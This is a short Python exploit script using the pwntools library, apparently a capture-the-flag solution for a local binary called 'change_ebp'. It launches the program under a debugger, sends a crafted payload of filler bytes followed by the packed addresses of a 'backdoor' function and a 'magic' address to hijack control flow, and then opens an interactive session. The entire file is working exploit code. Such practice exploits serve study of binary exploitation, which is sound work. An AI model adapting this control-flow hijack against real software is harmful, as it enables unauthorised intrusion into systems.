from pwn import *

p = process("./change_ebp")
gdb.attach(p,"b *0x080485D3")

backdoor = 0x0804850B
magic_addr = 0x0804A380

p.recvuntil("leave your name\n")
payload = "junk" + p32(backdoor) + p32(magic_addr)

p.send(payload)
p.interactive()
